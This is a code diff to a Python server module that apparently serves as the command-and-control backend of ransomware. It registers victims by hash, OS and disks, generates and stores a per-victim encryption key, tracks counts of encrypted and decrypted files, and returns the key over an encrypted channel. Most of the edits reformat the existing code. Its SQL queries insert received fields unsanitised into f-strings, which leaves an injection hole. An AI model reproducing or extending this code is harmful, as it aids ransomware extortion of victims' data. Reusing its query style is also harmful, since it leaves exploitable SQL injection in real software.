@@ -4,6 +4,7 @@ import utile.data as data
 import utile.message as message
 import utile.network as net
 import utile.security as secu
+
 THREADS_QUEUE = {'CONTROLE': '', 'FRONTAL': ''}
 
 
@@ -63,7 +64,7 @@ def Serveur_Frontal(FIFO_message_type):
                 packet_encrypt = secu.AES_GCM_encrypt(packet, key)
                 net.send_message(conn, packet_encrypt)
                 if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
-                        packet) == 'LIST_VICTIM_END' or message.get_message_type(packet) == 'INITIALIZE_RESP':
+                        packet) == 'LIST_VICTIM_END' or message.get_message_type(packet) == 'INITIALIZE_KEY':
                     break
 
 
@@ -112,11 +113,15 @@ def ThreadMaster(FIFO_message_type):
 
         elif message_type == 'INITIALIZE_REQ':
             conn, cursor = data.connect_to_DB()
-            if not data.execute_query(conn, cursor, f'SELECT hash, os, disks FROM victims WHERE hash ="{recv_data["INITIALIZE"]}"'):
-                query_victims = f'INSERT INTO victims(hash, os, disks, key )VALUES("{recv_data["INITIALIZE"]}", "{recv_data["OS"]}", "{recv_data["DISKS"]}", "{secu.generated_encrypted_key()}") '
+            if not data.execute_query(conn, cursor, f'SELECT hash, os, disks FROM victims WHERE hash ="'
+                                                    f'{recv_data["INITIALIZE"]}"'):
+                query_victims = f'INSERT INTO victims(hash, os, disks, key )VALUES("' \
+                                f'{recv_data["INITIALIZE"]}", "{recv_data["OS"]}", "{recv_data["DISKS"]}", ' \
+                                f'"{secu.generated_encrypted_key()}") '
                 data.execute_query(conn, cursor, query_victims)
                 victim_identity = data.execute_query(conn, cursor,
-                                                     f'SELECT id_victim FROM victims WHERE hash ="{recv_data["INITIALIZE"]}"')
+                                                     f'SELECT id_victim FROM victims '
+                                                     f'WHERE hash ="{recv_data["INITIALIZE"]}"')
                 query_states = f'INSERT INTO states(id_victim, state)VALUES({victim_identity[0][0]}, "INITIALIZE")'
                 query_encrypted = f'INSERT INTO encrypted(id_victim, nb_file)VALUES({victim_identity[0][0]}, "0")'
                 query_decrypted = f'INSERT INTO decrypted(id_victim, nb_file)VALUES({victim_identity[0][0]}, "0")'
@@ -124,14 +129,12 @@ def ThreadMaster(FIFO_message_type):
                 data.execute_query(conn, cursor, query_states)
                 data.execute_query(conn, cursor, query_encrypted)
                 data.execute_query(conn, cursor, query_decrypted)
-            list_info= data.execute_query(conn, cursor, f'SELECT v.id_victim, v.key, s.state FROM victims v JOIN states s ON s.id_victim = v.id_victim WHERE v.hash = "{recv_data["INITIALIZE"]}"')
+            list_info = data.execute_query(conn, cursor,
+                                           f'SELECT v.id_victim, v.key, s.state FROM victims v JOIN states s ON '
+                                           f's.id_victim = v.id_victim WHERE v.hash = "{recv_data["INITIALIZE"]}"')
             id_victim, key, state = list_info[0]
             FIFO_resp.put(message.set_message('INITIALIZE_KEY', [id_victim, key, state]))
-
-
-
-
-
+            FIFO_resp.join()
 
 
 def main():
